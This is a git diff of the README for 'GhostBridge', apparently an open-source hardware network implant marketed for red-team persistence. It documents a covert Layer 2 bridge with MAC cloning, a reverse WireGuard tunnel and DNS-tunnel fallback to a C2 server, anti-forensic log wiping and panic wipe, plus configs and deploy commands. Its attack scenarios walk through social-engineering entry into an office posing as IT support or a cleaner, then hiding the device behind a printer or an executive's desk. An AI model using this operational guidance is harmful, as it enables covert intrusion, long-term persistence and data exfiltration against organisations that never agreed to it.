@@ -3,15 +3,15 @@
 <p align="center">
   <img src="https://img.shields.io/badge/Platform-NanoPi%20R2S-orange?style=for-the-badge" alt="Platform">
   <img src="https://img.shields.io/badge/Python-3.11+-3776ab?style=for-the-badge&logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Status-v0.5.0%20Production%20Ready-green?style=for-the-badge" alt="Status">
-  <img src="https://img.shields.io/badge/Type-Implant-red?style=for-the-badge" alt="Type">
+  <img src="https://img.shields.io/badge/Status-v0.6.0-green?style=for-the-badge" alt="Status">
+  <img src="https://img.shields.io/badge/Tests-145%20Passing-success?style=for-the-badge" alt="Tests">
 </p>
 
 <h3 align="center">Transparent Network Implant for Red Team Persistence</h3>
 
 <p align="center">
   <strong>Drop it. Forget it. Own the network.</strong><br>
-  Invisible Bridge • Reverse VPN • Remote Access • Long-term Persistence
+  Invisible Bridge • Reverse VPN • DNS Tunneling • Long-term Persistence
 </p>
 
 <p align="center">
@@ -24,25 +24,16 @@
 
 ## 🎯 What is GhostBridge?
 
-GhostBridge is a **stealthy network implant** designed for Red Team operations. It's a small device that sits between a network port and a target device (PC, printer, etc.), creating a persistent backdoor into the corporate network.
+GhostBridge is a **stealthy network implant** designed for Red Team operations. It sits between a network port and a target device (PC, printer, etc.), creating a persistent backdoor into the corporate network.
 
-```
-                    ┌─────────────────────────────────────────────────┐
-                    │              TARGET NETWORK                      │
-                    │                                                  │
-   [Wall Port] ─────┤─── GhostBridge ───┤─── [Target PC/Printer]      │
-        │           │   (Invisible)     │                              │
-        │           └───────┬───────────┴──────────────────────────────┘
-        │                   │
-        │                   │ WireGuard Tunnel (Encrypted)
-        │                   │
-        ▼                   ▼
-   ┌─────────┐        ┌─────────────┐
-   │ Network │        │ Your VPS /  │
-   │ Traffic │        │ MoMo Server │
-   │ (Normal)│        │ (C2)        │
-   └─────────┘        └─────────────┘
-```
+| Component | Role |
+|-----------|------|
+| **Wall Port** → | Network source |
+| **GhostBridge** | Invisible bridge + tunnel |
+| → **Target Device** | PC, Printer, etc. |
+| **C2 Server** | Receives encrypted tunnel |
+
+**Key Concept:** The device bridges traffic transparently (Layer 2) while maintaining an encrypted tunnel to your C2 server.
 
 ---
 
@@ -50,14 +41,38 @@ GhostBridge is a **stealthy network implant** designed for Red Team operations. 
 
 | Feature | Description |
 |---------|-------------|
-| **Transparent Bridge** | Layer 2 bridge - completely invisible to network scans |
-| **MAC Cloning** | Clones target device MAC - no new device appears |
-| **Reverse VPN** | WireGuard tunnel to your C2 server |
-| **Auto-Reconnect** | Persistent connection with exponential backoff |
-| **Stealth Mode** | No open ports, no listening services |
-| **USB Powered** | Powers from printer/PC USB port |
-| **Tiny Form Factor** | Smaller than a cigarette pack |
-| **MoMo Integration** | Full integration with MoMo platform |
+| 🌉 **Transparent Bridge** | Layer 2 bridge - invisible to network scans |
+| 🎭 **MAC Cloning** | Clones target device MAC - no new device appears |
+| 🔐 **Reverse VPN** | WireGuard tunnel to your C2 server |
+| 🔄 **Auto-Reconnect** | Persistent connection with exponential backoff |
+| 🕵️ **Stealth Mode** | No open ports, no listening services |
+| 🔌 **USB Powered** | Powers from printer/PC USB port |
+| 📦 **Tiny Form Factor** | Smaller than a cigarette pack |
+| 🌐 **DNS Tunneling** | Covert C2 when VPN is blocked |
+| 🔗 **MoMo Integration** | Full integration with MoMo platform |
+
+---
+
+## 🆕 DNS Tunneling (v0.6.0)
+
+When WireGuard is blocked, GhostBridge falls back to DNS tunneling for covert communication.
+
+| Feature | Description |
+|---------|-------------|
+| **Encoding** | Base32, Base64, Hex (DNS-safe) |
+| **Compression** | Zlib for reduced query count |
+| **Stealth** | 0x20 bit randomization, jitter |
+| **Protocol** | TXT/NULL records over UDP/TCP |
+| **Fallback** | WireGuard → DNS → Auto-restore |
+
+### Fallback Chain
+
+| Priority | Method | Port | Use Case |
+|----------|--------|------|----------|
+| 1 | WireGuard UDP | 51820 | Primary - fastest |
+| 2 | WireGuard TCP | 443 | Firewalled networks |
+| 3 | DNS Tunnel | 53 | VPN blocked |
+| 4 | Auto-restore | - | Return to primary when available |
 
 ---
 
@@ -71,147 +86,60 @@ GhostBridge is a **stealthy network implant** designed for Red Team operations. 
 | **RAM** | 1GB DDR4 |
 | **Storage** | 32GB eMMC + MicroSD |
 | **Network** | 2x Gigabit Ethernet (WAN + LAN) |
-| **Size** | 55.6 x 52mm (smaller than credit card) |
+| **Size** | 55.6 x 52mm |
 | **Power** | 5V/2A USB-C |
 
-### Bill of Materials
+### Bill of Materials (~$75)
 
-| Item | Purpose | Est. Cost |
-|------|---------|-----------|
+| Item | Purpose | Cost |
+|------|---------|------|
 | NanoPi R2S Plus | Main board | $45 |
 | MicroSD Card 32GB | OS + Logs | $10 |
-| Short Ethernet Cable (15cm) | LAN connection | $3 |
+| Short Ethernet Cable | LAN connection | $3 |
 | USB-A to USB-C Cable | Power from target | $5 |
-| 3D Printed Case (optional) | Concealment | $10 |
-| **Total** | | **~$75** |
-
-### Alternative Hardware
-
-| Device | Pros | Cons |
-|--------|------|------|
-| NanoPi R2S (non-Plus) | Cheaper ($35) | No eMMC |
-| Raspberry Pi 4 | More powerful | Larger, needs USB-Ethernet |
-| GL.iNet GL-AR300M | Tiny, cheap | Less powerful, no Gigabit |
-| Zimaboard | x86, powerful | Larger, more power |
+| 3D Printed Case | Concealment | $10 |
 
 ---
 
 ## ⚔️ Attack Scenarios
 
 ### Scenario 1: Printer Drop
-```
 1. Enter office as "IT support" or cleaner
 2. Find network printer in corner
 3. Unplug printer's network cable from wall
 4. Insert GhostBridge between wall and printer
 5. Power GhostBridge from printer's USB port
 6. Leave - device tunnels home automatically
-```
 
-### Scenario 2: Meeting Room
-```
-1. Find conference room with network port
-2. Install GhostBridge behind TV/projector
-3. Bridge connection to display device
-4. Device hides behind furniture
-5. Persistent access to meeting room VLAN
-```
-
-### Scenario 3: Under-Desk Install
-```
+### Scenario 2: Under-Desk Install
 1. Social engineer access to office
 2. Find target executive's desk
 3. Install between wall and docking station
 4. Clone docking station's MAC
 5. Full access to executive's network segment
-```
 
 ---
 
 ## 🏗️ Architecture
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                        GhostBridge                               │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  │
-│  │  Bridge  │    │  Tunnel  │    │  Beacon  │    │  Stealth │  │
-│  │  Engine  │───▶│  Manager │───▶│  System  │───▶│  Module  │  │
-│  └──────────┘    └──────────┘    └──────────┘    └──────────┘  │
-│       │               │               │               │         │
-│       ▼               ▼               ▼               ▼         │
-│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  │
-│  │ eth0/eth1│    │ WireGuard│    │ Heartbeat│    │ Anti-    │  │
-│  │ Bridging │    │ wg0      │    │ to C2    │    │ Forensic │  │
-│  └──────────┘    └──────────┘    └──────────┘    └──────────┘  │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
-```
 
 ### Core Components
 
 | Component | Responsibility |
 |-----------|---------------|
 | **Bridge Engine** | Transparent L2 bridging, MAC cloning |
-| **Tunnel Manager** | WireGuard connection, auto-reconnect |
+| **Tunnel Manager** | WireGuard + DNS tunnel fallback |
 | **Beacon System** | Heartbeat, health checks, commands |
 | **Stealth Module** | Anti-forensics, log cleanup, kill switch |
 | **MoMo Link** | Integration with MoMo C2 platform |
 
----
+### Network Flow
 
-## 🔌 MoMo Integration
-
-GhostBridge integrates seamlessly with MoMo platform:
-
-```
-┌─────────────────┐         ┌─────────────────┐
-│   GhostBridge   │◄───────►│   MoMo Server   │
-│   (Field)       │  VPN    │   (C2)          │
-├─────────────────┤         ├─────────────────┤
-│ • Status beacon │         │ • Device mgmt   │
-│ • Network intel │         │ • Command queue │
-│ • Captured data │         │ • Data exfil    │
-│ • Live shell    │         │ • Web dashboard │
-└─────────────────┘         └─────────────────┘
-```
-
-### Integration Features
-
-- **Fleet Management** - Manage multiple GhostBridge devices
-- **Real-time Status** - See all implants on MoMo dashboard
-- **Command Queue** - Send commands to field devices
-- **Data Sync** - Automatic upload of captured intel
-- **Pivot Point** - Use as network pivot for attacks
-
----
-
-## 📡 Communication
-
-### Primary: WireGuard VPN
-
-```ini
-[Interface]
-PrivateKey = <generated>
-Address = 10.66.66.2/24
-DNS = 1.1.1.1
-
-[Peer]
-PublicKey = <C2_server_pubkey>
-Endpoint = your-c2.com:51820
-AllowedIPs = 0.0.0.0/0
-PersistentKeepalive = 25
-```
-
-### Fallback Options
-
-| Method | When Used |
-|--------|-----------|
-| WireGuard (UDP 51820) | Primary - fastest |
-| WireGuard over TCP 443 | If UDP blocked |
-| Cloudflare Tunnel | If VPN blocked |
-| DNS Tunneling (iodine) | Last resort |
+| Interface | Role | IP Address |
+|-----------|------|------------|
+| `eth0` (WAN) | To wall port | None (bridged) |
+| `eth1` (LAN) | To target | None (bridged) |
+| `br0` | Bridge | None |
+| `wg0` | Tunnel | 10.66.66.x |
 
 ---
 
@@ -239,9 +167,10 @@ PersistentKeepalive = 25
 
 ---
 
-## 🚀 Installation & Development
+## 🚀 Quick Start
 
-### Quick Start (Development)
+### Installation
+
 ```bash
 # Clone repository
 git clone https://github.com/Momo-Master/Momo-GhostBridge.git
@@ -260,79 +189,63 @@ pytest tests/ -v
 
 # Generate config
 ghostbridge config generate -o config.yml
-
-# Run self-tests
-ghostbridge test
-
-# Run health check
-ghostbridge health
 ```
 
 ### Deployment (NanoPi R2S)
+
 ```bash
-# Method 1: Quick Install Script
-curl -sSL https://raw.githubusercontent.com/.../install.sh | sudo bash
-
-# Method 2: Quick Deploy (with C2 config)
+# Quick Deploy (with C2 config)
 sudo ./scripts/deploy.sh "vpn.example.com:51820" "SERVER_PUBKEY"
-
-# Method 3: Manual Install
-ssh root@<device-ip>
-cd /opt/ghostbridge
-sudo bash scripts/install.sh
 
 # Start full system
 ghostbridge run
 ```
 
 ### CLI Commands
-```bash
-ghostbridge run                    # Run full system
-ghostbridge start                  # Start bridge only
-ghostbridge status                 # Show system status
-ghostbridge health                 # Health check
 
-ghostbridge tunnel connect         # Connect VPN tunnel
-ghostbridge tunnel status          # Tunnel status
+| Command | Description |
+|---------|-------------|
+| `ghostbridge run` | Run full system |
+| `ghostbridge status` | Show system status |
+| `ghostbridge tunnel connect` | Connect VPN tunnel |
+| `ghostbridge tunnel fallback dns` | Force DNS tunnel |
+| `ghostbridge stealth wipe` | Wipe logs |
+| `ghostbridge stealth panic` | Emergency wipe |
 
-ghostbridge stealth wipe           # Wipe logs
-ghostbridge stealth check          # Check for threats
-ghostbridge stealth panic          # Emergency wipe (DANGER!)
+---
 
-ghostbridge config generate        # Generate config file
-ghostbridge config validate        # Validate config
-ghostbridge test                   # Run self-tests
-```
+## ⚙️ Configuration
 
-### Configuration Options
 ```yaml
 # /etc/ghostbridge/config.yml
 network:
   bridge_name: br0
-  wan_interface: eth0      # To wall
-  lan_interface: eth1      # To target
-  clone_mac: true          # Clone target MAC on WAN
+  wan_interface: eth0
+  lan_interface: eth1
+  clone_mac: true
   
 tunnel:
   type: wireguard
   endpoint: your-c2.com:51820
-  private_key: /etc/wireguard/private.key
   keepalive: 25
-  reconnect_delay: [5, 10, 30, 60, 300]  # Exponential backoff
+  
+  # DNS Tunnel Fallback
+  dns_tunnel:
+    enabled: true
+    domain: tunnel.example.com
+    nameservers: ["8.8.8.8", "1.1.1.1"]
+    encoder: base32  # base32, base64, hex
+    chunk_size: 63
+    query_interval: 0.5
   
 beacon:
-  interval: 300            # 5 minutes
-  jitter: 60               # ±1 minute randomization
+  interval: 300
+  jitter: 60
   
 stealth:
   ramfs_logs: true
   fake_identity: "Netgear Switch"
   panic_wipe: true
-  
-momo:
-  enabled: true
-  api_endpoint: "https://momo.your-server.com/api"
-  device_id: "ghost-001"
 ```
 
 ---
@@ -341,38 +254,30 @@ momo:
 
 ```
 ghostbridge/
-├── src/ghostbridge/           # Main package
-│   ├── main.py               # Main orchestrator
-│   ├── cli.py                # Command line interface
-│   ├── core/                  # Core modules
-│   │   ├── config.py         # Configuration (Pydantic)
-│   │   ├── bridge.py         # L2 Bridge manager
-│   │   ├── tunnel.py         # Tunnel manager
-│   │   └── stealth.py        # Anti-forensics
-│   ├── c2/                    # C2 Integration
-│   │   ├── client.py         # MoMo API client
-│   │   ├── beacon.py         # Heartbeat service
-│   │   └── commands.py       # Command handlers
-│   └── infrastructure/        # System integration
-│       ├── network/          # Network operations
-│       ├── wireguard/        # WireGuard tunnel
-│       └── system/           # RAM disk, secure wipe
-├── scripts/                   # Shell scripts
-│   ├── install.sh            # Installation script
-│   ├── deploy.sh             # Quick deploy
-│   ├── build-image.sh        # SD card image builder
-│   ├── panic.sh              # Emergency wipe
-│   ├── setup-bridge.sh       # Bridge setup
-│   └── teardown-bridge.sh    # Bridge teardown
-├── services/                  # Systemd services
-│   ├── ghostbridge.service
-│   ├── ghostbridge-tunnel.service
-│   ├── ghostbridge-beacon.service
-│   └── ghostbridge-stealth.timer
-├── tests/                     # Test suite
-├── config/                    # Example configs
-└── docs/                      # Documentation
+├── src/ghostbridge/
+│   ├── main.py                 # Main orchestrator
+│   ├── cli.py                  # Command line interface
+│   ├── core/                   # Core modules
+│   │   ├── config.py           # Configuration
+│   │   ├── bridge.py           # L2 Bridge
+│   │   ├── tunnel.py           # Tunnel manager
+│   │   └── stealth.py          # Anti-forensics
+│   ├── infrastructure/
+│   │   ├── network/            # Network operations
+│   │   ├── wireguard/          # WireGuard tunnel
+│   │   ├── dns/                # DNS tunneling (NEW)
+│   │   │   ├── encoder.py      # Data encoding
+│   │   │   ├── client.py       # DNS client
+│   │   │   └── tunnel.py       # DNS tunnel
+│   │   └── system/             # RAM disk, secure wipe
+│   └── c2/                     # C2 Integration
+├── scripts/                    # Shell scripts
+├── services/                   # Systemd services
+├── tests/                      # Test suite (145 tests)
+└── docs/                       # Documentation
 ```
+
+---
 
 ## 📚 Documentation
 
@@ -387,14 +292,12 @@ ghostbridge/
 
 ## 🌐 MoMo Ecosystem
 
-GhostBridge integrates seamlessly with the MoMo ecosystem for centralized management.
-
 | Project | Description | Platform | Status |
 |---------|-------------|----------|--------|
-| **[MoMo](https://github.com/Momo-Master/MoMo)** | WiFi/BLE/SDR Audit Platform | Pi 5 | ✅ v1.5.2 |
-| **[MoMo-Nexus](https://github.com/Momo-Master/MoMo-Nexus)** | Central Communication Hub | Pi 4 | ✅ v1.0.0 |
-| **[MoMo-GhostBridge](https://github.com/Momo-Master/Momo-GhostBridge)** | Network Implant | NanoPi R2S | ✅ v0.5.0 |
-| **[MoMo-Mimic](https://github.com/Momo-Master/MoMo-Mimic)** | USB Attack Platform | Pi Zero 2W | ✅ v1.0.0 |
+| [**MoMo**](https://github.com/Momo-Master/MoMo) | WiFi/BLE/SDR Audit Platform | Pi 5 | ✅ v1.5.2 |
+| [**MoMo-Nexus**](https://github.com/Momo-Master/MoMo-Nexus) | Central C2 Hub | Pi 4 | ✅ v1.0.0 |
+| [**MoMo-GhostBridge**](https://github.com/Momo-Master/Momo-GhostBridge) | Network Implant | NanoPi R2S | ✅ v0.6.0 |
+| [**MoMo-Mimic**](https://github.com/Momo-Master/MoMo-Mimic) | USB Attack Platform | Pi Zero 2W | ✅ v1.0.0 |
 
 ---
 
@@ -426,4 +329,3 @@ This project is part of the MoMo ecosystem and is licensed under the **MIT Licen
   <a href="https://github.com/Momo-Master/Momo-GhostBridge">GhostBridge</a> •
   <a href="https://github.com/Momo-Master/MoMo-Mimic">Mimic</a>
 </p>
-
